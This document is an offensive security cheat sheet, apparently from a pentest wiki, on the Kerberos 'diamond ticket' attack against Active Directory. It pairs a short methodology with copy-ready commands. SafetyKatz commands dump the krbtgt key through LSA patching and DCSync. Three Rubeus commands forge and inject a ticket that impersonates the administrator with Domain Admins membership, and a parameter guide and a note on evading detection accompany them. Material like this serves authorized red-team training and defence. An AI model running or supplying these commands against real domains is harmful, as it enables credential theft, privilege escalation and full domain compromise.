>**ℹ️ Info:**
>More OPSEC-friendly than golden ticket since we're modifying a valid ticket instead of forging it.

# Methodology
>1. Retrieve the AES-256 key of the `krbtgt` account.
>2. Modify and inject the ticket.
>3. Impersonate any user.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz

**Retrieve the AES-256 key of the `krbtgt` account:**
```cmd
SafetyKatz.exe '"lsadump::lsa /patch"'
SafetyKatz.exe '"lsadump::dcsync /user:contoso\krbtgt"'
```

## Rubeus
**Create a diamond ticket:**
```cmd
# With an NTLM hash (Usually flagged by EDRs)
Rubeus.exe diamond /krbkey:32ED87BDB5FDC5E9CBA88547376818D4 /user:studentuserx /password:studentuserxpassword /enctype:rc4 /ticketuser:administrator /domain:us.contoso.local /dc:US-DC.us.contoso.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# With an AES-256 key (Admin cmd required)
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /user:studentuserx /password:studentuserxpassword /enctype:aes /ticketuser:administrator /domain:us.contoso.local /dc:US-DC.us.contoso.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# With access to a domain account
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.contoso.local /dc:US-DC.us.contoso.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

where:
- `/krbkey` is the AES-256 key or RC4 hash of the krbtgt account.
- `/user` is the username to steal a TGT from.
- `/password` is that user's password.
- `/enctype` specifies AES or RC4 encryption.
- `/ticketuser` is who we impersonate.
- `/domain` is the target domain name.
- `/dc` is the domain controller to use.
- `/ticketuserid` is the RID of the user we're impersonating (500 for admin).
- `/groups` is the RID of the group we add (512 for Domain Admins).
